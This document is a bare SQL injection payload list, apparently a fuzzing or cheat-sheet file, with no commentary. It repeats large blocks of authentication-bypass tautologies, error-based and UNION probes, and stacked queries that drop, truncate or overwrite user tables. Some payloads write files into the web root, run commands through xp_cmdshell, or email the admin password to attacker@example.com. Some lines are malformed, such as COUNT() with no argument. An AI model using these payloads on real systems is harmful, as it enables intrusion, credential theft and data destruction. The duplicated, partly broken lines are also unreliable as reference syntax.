' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
#error base
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
